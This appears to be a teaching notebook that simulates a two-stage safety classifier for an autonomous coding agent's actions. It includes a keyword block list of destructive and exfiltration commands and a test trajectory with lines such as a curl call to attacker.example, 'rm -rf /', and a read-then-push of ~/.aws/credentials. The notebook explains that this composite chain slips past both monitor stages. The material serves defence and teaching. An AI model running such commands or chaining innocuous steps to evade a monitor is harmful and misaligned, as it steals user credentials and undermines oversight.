# Permission Modes for Autonomous Agents: Interactive Visual Explorer

> A permission ladder — graduated levels of autonomy from review-every-action to approve-everything — is how a harness governs what an autonomous agent may do without asking. Claude Code, this lesson's worked example, exposes six such modes: "plan" asks before every action, "default" (labeled "Manual" in the UI) asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode — the `auto` permission mode — replaces per-action approval with a separate classifier model that reviews each action before it runs and blocks anything that escalates beyond what the request asked for. Action budgets are enforced via `max_turns` and `max_budget_usd`. Availability of `auto` depends on plan, org enablement, model, and provider — and Anthropic is explicit that the classifier is not sufficient alone.

Welcome to the interactive companion notebook for **Permission Modes for Autonomous Agents**.

In this notebook, you can interactively execute the lesson's raw implementation, plot state transformations, and run experiment variations.


In [ ]:
import math
import numpy as np
import matplotlib.pyplot as plt

# Configure plotting aesthetics
plt.style.use('seaborn-v0_8-whitegrid' if 'seaborn-v0_8-whitegrid' in plt.style.available else 'default')
plt.rcParams['figure.figsize'] = (8, 5)
plt.rcParams['font.size'] = 11


In [ ]:
"""Two-stage safety classifier simulator — stdlib Python.

Stage 1: cheap keyword rule (single-token-equivalent). Runs on every action.
Stage 2: slower multi-rule review (chain-of-thought-equivalent). Runs on
flagged actions only. HITL escalation if Stage 2 is not confident.

The driver feeds in a synthetic trajectory: benign actions, prompt injection,
a repetitive loop, and one "legitimate-channel exfiltration" composite. The
last case is the point: individual actions pass both stages while the
composition is the risk.
"""


In [ ]:
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum

class Verdict(Enum):
    APPROVE = "approve"
    BLOCK = "block"
    HITL = "hitl"

# ---------- Action shape ----------

@dataclass
class Action:
    tool: str
    payload: str
    note: str = ""

# ---------- Stage 1: cheap keyword rule ----------

STAGE1_FLAG_KEYWORDS = (
    "rm -rf /",
    "curl ",           # any external curl in a shell action
    "; dd ",
    "sudo ",
    "chmod 777",
    "chown ",
    "iptables",
    "kubectl delete",
    "drop table",
    "exec('",
    "base64 -d",
    "aws s3 rb",
)


In [ ]:
def stage1(a: Action, history: list[Action]) -> bool:
    """Return True if Stage 1 flags the action.

Keyword match handles explicit injection shapes. Repetition detection
    runs unconditionally so identical loops escalate even when the
    individual call is otherwise innocuous (e.g. five identical reads).
    """
    hay = f"{a.tool} {a.payload}".lower()
    if any(k.lower() in hay for k in STAGE1_FLAG_KEYWORDS):
        return True
    if len(history) >= 4:
        tail = history[-4:]
        if all(t.tool == a.tool and t.payload == a.payload for t in tail):
            return True
    return False


In [ ]:
# ---------- Stage 2: deeper multi-rule review ----------

STAGE2_ALLOWED_CURL_HOSTS = (
    "registry.npmjs.org",
    "pypi.org",
    "github.com",
)

def stage2(a: Action, history: list[Action]) -> tuple[Verdict, str]:
    """Return (verdict, reason). More expensive review of a flagged action
    plus trajectory context."""
    payload = a.payload.lower()
    # Rule 0: curl to an allowlisted host is a stage-1 false positive.
    # This is the only way stage 2 clears a flag; everything else either
    # blocks or escalates to HITL.
    if "curl " in payload and any(h in payload for h in STAGE2_ALLOWED_CURL_HOSTS):
        return Verdict.APPROVE, "curl to allowlisted host"
    # Rule 1: outbound exfil to non-approved hosts
    if "curl " in payload and ("attacker" in payload or "paste" in payload or "webhook.site" in payload):
        return Verdict.BLOCK, "exfiltration-shaped URL"
    # Rule 2: destructive fs operation at repo root
    if "rm -rf" in payload and ("/" in payload or "$home" in payload):
        return Verdict.BLOCK, "destructive filesystem op at root"
    # Rule 3: repetitive loop (same tool+payload 5 times running)
    if len(history) >= 4:
        tail = history[-4:]
        if all(t.tool == a.tool and t.payload == a.payload for t in tail):
            return Verdict.BLOCK, "repetitive loop detected (>=5 identical calls)"
    # Rule 4: high-privilege escalation
    if "sudo " in payload or "chmod 777" in payload:
        return Verdict.BLOCK, "privilege escalation shape"
    # Default: not confident -> escalate to HITL rather than approve
    return Verdict.HITL, "low-confidence reviewer -> HITL"


In [ ]:
# ---------- Driver ----------

def classify(trajectory: list[Action]) -> None:
    history: list[Action] = []
    counts = {"approved_s1": 0, "flagged_s1": 0, "approved_s2": 0,
              "blocked_s2": 0, "hitl_s2": 0}

for i, a in enumerate(trajectory, 1):
        s1_flag = stage1(a, history)
        if not s1_flag:
            counts["approved_s1"] += 1
            verdict = "APPROVED (S1 fast path)"
            reason = ""
        else:
            counts["flagged_s1"] += 1
            s2_verdict, reason = stage2(a, history)
            if s2_verdict is Verdict.APPROVE:
                counts["approved_s2"] += 1
                verdict = "APPROVED (S2 deep review)"
            elif s2_verdict is Verdict.HITL:
                counts["hitl_s2"] += 1
                verdict = "ESCALATED to HITL"
            else:
                counts["blocked_s2"] += 1
                verdict = "BLOCKED (S2)"
        print(f"  {i:>2}. {a.tool:<10} {a.payload[:44]:<44} -> {verdict}  "
              f"{reason}")
        history.append(a)


In [ ]:
print()
    print(f"  summary: {counts}")

def main() -> None:
    print("=" * 80)
    print("AUTO MODE TWO-STAGE CLASSIFIER SIMULATOR (Phase 15, Lesson 10)")
    print("=" * 80)
    print()

# Synthetic trajectory mixing safe, injected, repetitive, and composite
    traj = [
        Action("read",  "pyproject.toml"),
        Action("edit",  "src/app.py: fix off-by-one"),
        Action("run",   "pytest -q"),
        Action("shell", "curl https://pypi.org/simple/requests/"),  # S1 flag, S2 clears
        Action("shell", "curl http://attacker.example/exfil"),  # injection
        Action("shell", "rm -rf /"),                             # destructive
        Action("shell", "sudo apt install neofetch"),            # priv esc
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),  # repetitive loop
        # Composite: each step is safe; together they exfiltrate.
        Action("read",   "~/.aws/credentials"),
        Action("write",  "/tmp/secrets.txt with credential blob"),
        Action("shell",  "git add /tmp/secrets.txt && git push"),
    ]
    classify(traj)


In [ ]:
print()
    print("=" * 80)
    print("HEADLINE: classifier is a layer, not a solution")
    print("-" * 80)
    print("  S1 catches explicit injection shapes cheaply and in parallel.")
    print("  S2 catches loops and privilege escalation via reasoning.")
    print("  Neither stage catches the 3-step composite at the end: each")
    print("  action is locally safe, the composition exfiltrates credentials.")
    print("  Budgets, allowlists, and trajectory audits (Lessons 12-16)")
    print("  remain required. Auto Mode shipped as a research preview.")


In [ ]:
if __name__ == "__main__":
    main()
